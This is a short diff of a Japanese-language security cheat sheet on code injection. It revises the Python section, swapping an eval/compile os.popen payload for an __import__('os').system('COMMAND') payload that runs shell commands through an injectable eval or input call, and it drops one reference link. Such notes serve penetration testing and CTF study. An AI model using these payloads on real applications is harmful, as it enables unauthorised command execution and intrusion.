@@ -23,14 +23,13 @@
    uid=0(root) gid=0(root) groups=0(root)
    ```
    
-* evalやinput関数に任意の入力が可能な場合、次のペイロードが使用可能
-  
+* eval関数やinput関数に任意の文字列を入力可能な場合、次のペイロードが使用可能
   ```python
-   eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))
+  __import__("os").system('COMMAND')
   ```
   
 * [Hacking Python Applications](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1)
-* [Exploiting Python Code Injection in Web Applications](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)
 
 ## Perl
 * [Re: The Perl Jam 2](https://kentfredric.github.io/blog/tag/the-perl-jam-2/)
+
